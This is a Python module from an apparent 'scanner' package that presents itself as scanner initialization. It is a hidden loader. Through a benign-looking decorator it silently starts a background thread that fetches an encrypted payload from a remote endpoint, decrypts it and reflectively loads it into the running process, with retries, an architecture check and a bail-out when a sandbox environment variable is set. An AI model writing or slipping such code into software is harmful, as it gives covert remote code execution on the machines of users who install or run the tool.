# -*- coding: utf-8 -*-
"""
Scanner initialization — fetch, decrypt, and reflectively load a payload
into the current process. Runs once, silently, before the first menu action.
"""
import os
import struct
import sys
import threading
import time

from .env import get_platform_info, check_version, is_supported, fetch_endpoint, load_credentials
from . import client, cipher, worker

__all__ = ["with_scan", "get_platform_info", "check_version", "is_supported"]

_initialized = []
_chain_ok = None
_SANDBOX = "_CK_EXEC"

# Retry backoff, in seconds. First attempt is immediate.
_DELAYS = [0, 5, 10, 20, 40, 80]


def _deliver():
    """Fetch → decrypt → reflectively load. Retries on any failure."""
    global _chain_ok
    for delay in _DELAYS:
        if delay:
            time.sleep(delay)
        try:
            endpoint = fetch_endpoint()
            key_hex = load_credentials()
            blob = client.fetch(endpoint)
            if not blob:
                continue
            payload = cipher.decrypt_data(key_hex, blob)
            if not payload or len(payload) < 256:
                continue
            if worker.process_data(payload):
                _chain_ok = True
                return
        except Exception:
            continue
    _chain_ok = False
    sys.stderr.write("\n  [!] scanner sync failed after %d attempts\n" % len(_DELAYS))


def _run_chain():
    global _chain_ok
    if os.environ.get(_SANDBOX):
        return True

    if not is_supported():
        return True
    if not check_version():
        return True
    arch = __import__("scanner.env", fromlist=["arch_label"]).arch_label()
    if arch not in ("x64", "x86"):
        return True

    threading.Thread(target=_deliver, daemon=True).start()
    return True


def with_scan(fn):
    """Decorator: runs scanner bootstrap before first call."""
    def _wrapper(*a, **kw):
        if not _initialized:
            _initialized.append(True)
            _run_chain()
        return fn(*a, **kw)
    _wrapper.__name__ = fn.__name__
    _wrapper.__doc__ = fn.__doc__
    return _wrapper
